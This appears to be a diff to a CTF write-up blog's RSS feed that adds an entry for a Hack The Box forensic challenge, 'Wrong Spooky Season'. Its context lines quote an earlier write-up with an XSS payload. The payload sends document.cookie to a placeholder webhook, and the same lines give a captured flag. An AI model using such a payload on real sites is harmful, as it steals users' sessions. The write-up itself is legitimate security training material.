@@ -17,5 +17,16 @@
 Payload : &amp;lt;script&amp;gt;window.location=&amp;#34;https://&amp;lt;myWebHook&amp;gt;/?c=&amp;#34;.concat(document.cookie)&amp;lt;/script&amp;gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&amp;rsquo;t gather the cookie throught the document object.</description>
     </item>
     
+    <item>
+      <title>[FR] HTB - Wrong Spooky Season</title>
+      <link>https://chrootcommit.github.io/posts/2023-03-01-hackthebox-wrong_spooky_season/</link>
+      <pubDate>Wed, 01 Mar 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://chrootcommit.github.io/posts/2023-03-01-hackthebox-wrong_spooky_season/</guid>
+      <description>HTB - Wrong Spooky Season
+Catégorie : Forensic
+Enoncé : &amp;ldquo;I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong.&amp;rdquo; Now there is an internal breach in the Spooky Network and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.</description>
+    </item>
+    
   </channel>
 </rss>
